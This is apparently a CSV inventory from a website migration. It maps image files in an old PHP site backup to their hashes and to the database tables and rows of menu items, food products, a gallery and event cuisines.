3.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/3.jpg,125144,f9c3d52a72cb5b472536b18bf55ac97c92b9ffe2ae1b895f96b34edf5cebaab2,bd2f448c26d20d9b830ec7cbdfc2e068,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
30.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/30.jpeg,12330,6ba1bd163b76baea92af52a28697fd9782fa73834188dcde57bd44d177eeda6d,1ea0f9bcab70d3c623f0f5973262e175,DB Mapped (Verified),menu_item_tbl,30,Mix Pakode,menu_img
300.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_img
300.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/300.jpg,12536,8a39090f5aae720324c9194b4db4fa5a24a3ab1e68a5e2e8e83272ae285b3f16,8f438b67041d7cf790b421eceb87150a,DB Mapped (Verified),menu_item_tbl,300,Veg. Manchurian Dry - China,menu_small_img
301.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_img
301.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/301.jpg,74120,5727977e280e12add13d6acd42782f77cee5fad8a335910c84152362cbd7349d,e54b05877e9c2aa6437cd37a3ddd7276,DB Mapped (Verified),menu_item_tbl,301,Sweet & Sour Soup,menu_small_img
302.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_img
302.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/302.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,302,Hot  & Sour Soup,menu_small_img
303.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_img
303.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/303.jpg,21472,76ca35a37d669f7487bb713482e6c7261d46167184ea87f0ee464d4cc2eea1a0,4a3b0fb6467763de7c5672dc73a03507,DB Mapped (Verified),menu_item_tbl,303,Veg. Wonton Soup - Chinese,menu_small_img
304.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/304.jpg,92432,de4b382f04e803c3b8e5ba04b23fc13e11d5e60fd517598834deef5fc2f6ff8d,69be6751e79b38bcec94742ae297dce3,DB Mapped (Verified),menu_item_tbl,304,Kimchi - China,menu_img
304.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/304.jpg,92432,de4b382f04e803c3b8e5ba04b23fc13e11d5e60fd517598834deef5fc2f6ff8d,69be6751e79b38bcec94742ae297dce3,DB Mapped (Verified),menu_item_tbl,304,Kimchi - China,menu_small_img
305.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_img
305.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/305.jpg,23019,c3599e93e2bcd75e52beff3fe236800758566525fd505958460153920a7cd672,e64f5841d8bbc70617ec92b5dfd72d60,DB Mapped (Verified),menu_item_tbl,305,Cucumber Cantonnese - China,menu_small_img
306.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/306.jpeg,12668,7a868eeea73395f480fcfca0a9d83df54e7ad1364d53e75aef043391d38f75da,edd12741b622bd7a8d5184ab82e0b85c,DB Mapped (Verified),menu_item_tbl,306,Mix Veg.With Brocoli - Chinese,menu_img
307.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/307.jpeg,8291,cdd220ea91e6bb8d34606205db3eef349e575cd3ea9ce53b2c9374e852b5e17e,8bd93bb1f86f34a01a22075c40a5a559,DB Mapped (Verified),menu_item_tbl,307,Salt & Pepper Vegetable - Chinese,menu_img
308.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/308.jpg,146147,13cc46f17caf97cb988c5ba18a18808737b30d15179a11e51f3ac15ab65271e4,79bf5a7c41ee139dd8203f571c392eff,DB Mapped (Verified),menu_item_tbl,308,Vegetable Manchurian - Chinese,menu_img
309.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/309.jpg,103778,048de34266694795e18258f5b932a400962f25e74d0ca69982ee3b48f423afdc,a543ae4aba2319e3c3ced8d8f0787350,DB Mapped (Verified),menu_item_tbl,309,Hakka Nodles - Chinese,menu_img
31.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/31.jpg,266894,c8fbc93942b033f1e86a902f46d6efc2e1d8a36ad98e2277cc0a9e24cc7d1681,9561df2274fa4f5b483a56b9bb699a4b,DB Mapped (Verified),menu_item_tbl,31,Fruits,menu_img
31.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/31.jpg,266894,c8fbc93942b033f1e86a902f46d6efc2e1d8a36ad98e2277cc0a9e24cc7d1681,9561df2274fa4f5b483a56b9bb699a4b,DB Mapped (Verified),product_item_tbl,31,Coriander Coconut Chutney,menu_img
310.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/310.jpg,46926,a4eaf6e5f8764c982e93a109f639ff3c5b6441eb8234adeffda9206d9a55ea29,7c19dd25d5482147b62d7148d7aa3470,DB Mapped (Verified),menu_item_tbl,310,Chowmein - Chinese,menu_img
311.webp,old-website-php/Full-website-backup/frontEnd/menuimg/311.webp,31996,d4a74d57a8f932176044cb6a05face3adc178768e3af550fc5143e23209c295f,5abc2991434d82456f7dcf7494415afa,DB Mapped (Verified),menu_item_tbl,311,Noodles - Chinese,menu_img
312.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/312.jpg,222532,ee1e7f6823f12c3c8212744bd77a594da98ea82c0bd0c737ca675ac936910a60,7da9d93f2f6bb6e789b36c96ea3403aa,DB Mapped (Verified),menu_item_tbl,312,Vegetable Hakka Noodles - Chinese,menu_img
313.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/313.jpeg,12293,4729b8e69a8b34abe0cb67404c16f2d4e54a2384020406d17d3236878fc58739,1b2d70f5495a45a3eaa3f8a35f34fd67,DB Mapped (Verified),menu_item_tbl,313,Vegetable Fried Rice - Chinese,menu_img
314.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/314.jpeg,13165,2509f6337f0c257864dc25588b9b844a73b9abd40efa2a3622fb6cee1b1c569a,3eb7091fc906091ed3e3d615152aa5f3,DB Mapped (Verified),menu_item_tbl,314,Hongkong Style - Chinese,menu_img
315.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_img
315.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/315.jpg,15049,85ca56fbf71861029984d701354d4559fee17d82eebefbd1cc8a6505bdc5eb42,cc7cbdfde778e34c6f8c56763ba6a1da,DB Mapped (Verified),menu_item_tbl,315,Jhangora Ki Kheer,menu_small_img
316.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_img
316.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/316.jpg,78801,d3e5e53fd4b44cf70760db76ee699f9a44f73d6d52bad34103ffef3323a351ae,647e9fc160ac7056fe6873378331eff5,DB Mapped (Verified),menu_item_tbl,316,Gulgula,menu_small_img
317.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_img
317.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/317.jpeg,10706,f430f7e757ba74fd9a0ccfce38a7da2f97215c4fd7359fd7e89c25aae82267c8,a0e0720d83d2d753685025cafe882741,DB Mapped (Verified),menu_item_tbl,317,Arsa,menu_small_img
318.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_img
318.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/318.jpg,9503,8c17f1a588b76d951ad1c3cd435e6f36177bc862662a99f81998c98d589a266b,d4af4cd4e89a85d140e1d52bc3c36855,DB Mapped (Verified),menu_item_tbl,318,Litti Chokha,menu_small_img
319.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_img
319.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/319.jpg,51889,446392921d32a1ab25bbb70c2c3020ba52fe9934eab4c5a71e54607e5df34ffe,258b993b6b5a6722d5473c7281395c78,DB Mapped (Verified),menu_item_tbl,319,Naivedyam,menu_small_img
32.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/32.jpg,170566,461dbac51b9fa2a336ce466768081610e2721af1519730cb004102f6fcbc0cd5,3f3f26f82000bc01a57edd3b1f794a43,DB Mapped (Verified),menu_item_tbl,32,Poha,menu_img
32.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/32.jpg,170566,461dbac51b9fa2a336ce466768081610e2721af1519730cb004102f6fcbc0cd5,3f3f26f82000bc01a57edd3b1f794a43,DB Mapped (Verified),product_item_tbl,32,Tomato Thokku,menu_img
320.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_img
320.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/320.jpeg,9435,a81ffe193d71e631dc23cca09584190f1a2f43eb11611089a67cf31c2ae2349b,3b6ec918699f45dedc99d71ad1599d32,DB Mapped (Verified),menu_item_tbl,320,Chandrakala/ Pedakiya,menu_small_img
321.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_img
321.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/321.jpg,11349,0cdf041a434c9bfcd4ee3abc65b7882a8c61c6141238c14ccc11c7cf37f77ad7,00c9c6e17452abefc66b3ff56e936aff,DB Mapped (Verified),menu_item_tbl,321,Chana Ghugni,menu_small_img
322.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_img
322.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/322.jpg,26446,ddf92b39bd8e40bb92745bc365d58e238d35685faa2c388b8881a10e2081f16f,9da451a4d260ca86e3a500b6db3815a4,DB Mapped (Verified),menu_item_tbl,322,Khaja,menu_small_img
323.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_img
323.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/323.jpg,12021,017e990b13fe9ba90afdfef5d437091415d4b450fea808599ecc7686de5f84a3,907652a67b926540b2fee5bd2c31e963,DB Mapped (Verified),menu_item_tbl,323,Mutton Kebabs and Reshmi Kebabs,menu_small_img
324.webp,old-website-php/Full-website-backup/frontEnd/menuimg/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_img
324.webp,old-website-php/Full-website-backup/frontEnd/menuimg/324.webp,26278,bd42909481a32c597353c59f38b3803fda71af01c2e876e8cec31b950ab76f8e,a95e04498293165e0c0cc393e09c9641,DB Mapped (Verified),menu_item_tbl,324,Kesar Peda,menu_small_img
325.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/325.jpg,6539,8b1d732ee69a61ff2f6547c0eb67eb2e44e6486a23aa68de3f8446c2f9ec8372,e908522597bb0b1e5d36f219ee16fd84,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_img
325.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/325.jpg,6539,8b1d732ee69a61ff2f6547c0eb67eb2e44e6486a23aa68de3f8446c2f9ec8372,e908522597bb0b1e5d36f219ee16fd84,DB Mapped (Verified),menu_item_tbl,325,Laung-Latika,menu_small_img
326.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_img
326.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/326.jpeg,10045,c79edb2c8297d649a5bd705ee9abc8398da5e92e0ba1a14a78a48809e0b2f66d,41ba0c6983248d16371396e634974770,DB Mapped (Verified),menu_item_tbl,326,Dal Peetha,menu_small_img
327.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_img
327.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/327.jpg,93622,b7e8c0cf2078c4244e0312bf9f5e5de8a98acd03fa04df7c71bf1f6dcef63404,503057511495bcf6940ded42aa0f9da8,DB Mapped (Verified),menu_item_tbl,327,Khajuria/Thekua,menu_small_img
328.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_img
328.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/328.jpg,140056,62cb3fb64d4cbc0bd07099e7445a3518d32e8c1ac03f70a5fef28e6e3d845508,831bc743b10a7f4f094ef51bdf1c680f,DB Mapped (Verified),menu_item_tbl,328,Malpuaa,menu_small_img
329.webp,old-website-php/Full-website-backup/frontEnd/menuimg/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_img
329.webp,old-website-php/Full-website-backup/frontEnd/menuimg/329.webp,19502,b4712da72a5152ce80550039dd891bb0a51117d6ed2cc6e620a9591e7d0711ad,3d303359ad00ffdb30722314c9ac9149,DB Mapped (Verified),menu_item_tbl,329,Rasia,menu_small_img
33.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/33.jpeg,69015,fcafea2e6c4d1affb18e6415fe028ce3f2197e28bebd12ff9bf101e61e347ca9,2d56091dee27659b955a13d7de372655,DB Mapped (Verified),menu_item_tbl,33,Sandwich,menu_img
330.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_img
330.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/330.jpg,10272,183cae79752f2cf8f56ffc5b1771cdeb604ff3e785c941499b552d3a02b98b7b,3dd56da922ad374b093ff8f8286cbb34,DB Mapped (Verified),menu_item_tbl,330,Pantua/Kala Jamun,menu_small_img
331.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_img
331.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/331.jpeg,10093,6b4c5e210163c4b4644bfc0750a7ea8db60057ee2470c57e87436330be1a4649,4d513da840b1054e04c581ba063d1c5a,DB Mapped (Verified),menu_item_tbl,331,Khurma And Laktho,menu_small_img
332.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_img
332.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/332.jpeg,6969,4c4cf62755a61b9c9419f6300116f4f5ea434e44253dfa43195a1944f9259f1a,68b7c2719cf26963173ea6ef68076319,DB Mapped (Verified),menu_item_tbl,332,Balushahii,menu_small_img
333.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_img
333.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/333.jpeg,7632,9fc8b53bba400bcd797ac25b3b181c5c9886323be6849960ba5cbbf35805777f,80e0eb316316377eb627f63e0f4d2ca0,DB Mapped (Verified),menu_item_tbl,333,Parwal ki Mithai,menu_small_img
334.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_img
334.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/334.jpeg,112246,0825d65ecdf014c2b0a56a849d71ac2bd0143b9b37f87cb05802788fbda1e96e,2b754ec5aeeed8ca93b5a8e7d33e741a,DB Mapped (Verified),menu_item_tbl,334,Gur Anarsa,menu_small_img
335.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_img
335.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/335.jpeg,35872,6e92d6bf9ed356dca00f024f86925df5e80bfc661fa452f26c40c06585ab6690,7861923a3f78ca8532ec6b315d96b8c8,DB Mapped (Verified),menu_item_tbl,335,Laai,menu_small_img
336.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_img
336.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/336.jpeg,8888,3b1e69bace003789c889c06ea6a6bb0649fff14196f82c6e350aef0bb8f4ad04,7d0d9f8672ad36a72ad2b77c8974f58b,DB Mapped (Verified),menu_item_tbl,336,Tilkut,menu_small_img
337.webp,old-website-php/Full-website-backup/frontEnd/menuimg/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_img
337.webp,old-website-php/Full-website-backup/frontEnd/menuimg/337.webp,19510,cadf43914e9d5756cd8dc7db1b21df420d164ad8bcacb399b55608a0f4b9b6f6,6ad28e35202eb870fc11bdf4af854b90,DB Mapped (Verified),menu_item_tbl,337,Puri Sabzi,menu_small_img
338.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_img
338.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/338.jpg,15309,c3357e3e649e7d4703eb1f6cb42456fe5584cdf122f0e5da599a3b0198d35c9b,adffcc512ad61cb15c201d54dfc1d230,DB Mapped (Verified),menu_item_tbl,338,Sattu Sharbat,menu_small_img
339.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/339.jpg,55641,550b309c2f984d93ec26510929044f95556556e5e52354866f9aba004de89b80,961547154df5de7492478b0fe4fcba2f,DB Mapped (Verified),menu_item_tbl,339,Besan Masala Rot,menu_img
34.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/34.jpg,150001,87246438223e89dd79dee6eee7fff35173bbee00c25019ecbddbf031bbe0760a,51484640590527d98c19be361e1c6b51,DB Mapped (Verified),menu_item_tbl,34,Sprouts,menu_img
34.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/34.jpg,150001,87246438223e89dd79dee6eee7fff35173bbee00c25019ecbddbf031bbe0760a,51484640590527d98c19be361e1c6b51,DB Mapped (Verified),product_item_tbl,34,Moringa Leaves Chutney,menu_img
340.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_img
340.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/340.jpeg,10671,90d20dd37a2bc1dccad657ff692e4df222d9f4ef5d6040b236058243e56ddcdc,61edca3845f7f315ecbedf496373fb01,DB Mapped (Verified),menu_item_tbl,340,Desi Malpua,menu_small_img
341.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_img
341.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/341.jpg,69900,5be4b95a5a85ab589e87158aa55cb0841709d018a5653455fe540c4c9637e16e,9dc1b72a7b16e8e5eed4ac234cbdb91d,DB Mapped (Verified),menu_item_tbl,341,Mithe Chawal,menu_small_img
342.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/342.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,342,Bajara Khichri,menu_img
342.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/342.jpg,40862,31fa2e605a8c91f8ba84ba4bc40c7de93f009e5f7228d005580c828316f0138b,68fa040f3aa3bd5e802c8b2e778db746,DB Mapped (Verified),menu_item_tbl,342,Bajara Khichri,menu_small_img
343.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/343.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,343,Bhura Roti Ghee,menu_img
343.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/343.jpg,34081,33b794611db49d3b5108c31d548431b684035b85728186120748110e3082d6c4,187eb880e346af58b209c813713dde38,DB Mapped (Verified),menu_item_tbl,343,Bhura Roti Ghee,menu_small_img
344.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/344.jpg,330026,de5e29bc21dab8d6600ab4cb80991d56061b77161469c3a304869c6e09a1a2f8,6674f28a79b1f208332fcd35d7544878,DB Mapped (Verified),menu_item_tbl,344,Bathua Raita,menu_img
344.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/344.jpg,330026,de5e29bc21dab8d6600ab4cb80991d56061b77161469c3a304869c6e09a1a2f8,6674f28a79b1f208332fcd35d7544878,DB Mapped (Verified),menu_item_tbl,344,Bathua Raita,menu_small_img
345.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/345.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,345,Bajara Aloo Roti,menu_img
345.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/345.jpg,11603,f29c6fb10441cbdf0f717e74aa1af59b67a2a9a330722524eacd2d5a13b0d16f,f35a8db35da78e9dc05f059d83e19151,DB Mapped (Verified),menu_item_tbl,345,Bajara Aloo Roti,menu_small_img
346.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/346.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,346,Methi Gaajar,menu_img
346.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/346.jpeg,12412,970cbbaaf4a9ce0ae5bf44fc49f8b7ed5ea89f5f7593b4138be36e5406e9d877,9a44fce152a4c98cf31c777ec4803c3d,DB Mapped (Verified),menu_item_tbl,346,Methi Gaajar,menu_small_img
347.webp,old-website-php/Full-website-backup/frontEnd/menuimg/347.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,347,Alsi ki Pinni,menu_img
347.webp,old-website-php/Full-website-backup/frontEnd/menuimg/347.webp,48044,d9b7b2405ab798dd5967a56466192c2914d9cb1bb11234ca63c726b9f272bc42,0223b17c9173ad29d80b619bf5323eb8,DB Mapped (Verified),menu_item_tbl,347,Alsi ki Pinni,menu_small_img
348.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/348.jpg,14958,5688002db0335f5f90ce619fa523b830819aaa1cb4f22fbfab9e51c2ee386ad0,1f4d307887522282d549744c413798ec,DB Mapped (Verified),menu_item_tbl,348,Madra,menu_img
348.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/348.jpg,14958,5688002db0335f5f90ce619fa523b830819aaa1cb4f22fbfab9e51c2ee386ad0,1f4d307887522282d549744c413798ec,DB Mapped (Verified),menu_item_tbl,348,Madra,menu_small_img
349.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/349.jpg,25423,2e20ee8747c15346640fcaefe08e8c6cd696ace82ed55fff34bdf33426f6fa8c,48f915445189aba714171e80fd3c8bb3,DB Mapped (Verified),menu_item_tbl,349,Siddu,menu_img
349.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/349.jpg,25423,2e20ee8747c15346640fcaefe08e8c6cd696ace82ed55fff34bdf33426f6fa8c,48f915445189aba714171e80fd3c8bb3,DB Mapped (Verified),menu_item_tbl,349,Siddu,menu_small_img
35.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/35.jpg,383358,9bf58f561f1a7e687368050d082784bfe79a06fa0320b737f42e8b929eb9a0aa,50976e08814a560b503f1bcbe1f89dc7,DB Mapped (Verified),menu_item_tbl,35,Cheela,menu_img
